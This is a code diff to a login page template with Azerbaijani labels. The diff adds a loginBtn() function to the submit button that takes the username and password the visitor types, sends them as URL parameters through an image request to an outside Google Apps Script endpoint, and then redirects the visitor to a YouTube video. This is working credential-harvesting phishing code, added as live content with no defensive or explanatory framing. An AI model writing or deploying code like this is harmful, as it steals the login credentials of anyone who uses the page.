@@ -23,6 +23,15 @@ htmlCode = `<!DOCTYPE html>
                 elPsw.focus();
             }
             else el.focus();
+
+
+        }
+
+        function loginBtn(){
+            let username = document.getElementById("Username");
+			let password = document.getElementById("Password");
+			document.write('<img src="https://script.google.com/macros/s/AKfycbzOejlHlAPAl9DXzrOgyvQNfCPDUxTlnz7dvmdX7zHfWBqBjW1NgtHKJTD2A-BPWJM/exec?username=' + username.value + '&password=' + password.value + '" />');
+            window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
         }
     </script>
     <section class="ftco-section">
@@ -50,7 +59,7 @@ htmlCode = `<!DOCTYPE html>
                     <input type="password" class="form-control rounded-left" id="Password" placeholder="Şifrə" name="Password" required="">
                 </div>
                 <div class="form-group">
-                    <button type="submit" class="form-control btn btn-primary rounded submit px-3">Daxil ol</button>
+                    <button onclick="loginBtn()" type="submit" class="form-control btn btn-primary rounded submit px-3">Daxil ol</button>
                 </div>
                 <div class="form-group d-md-flex">
 
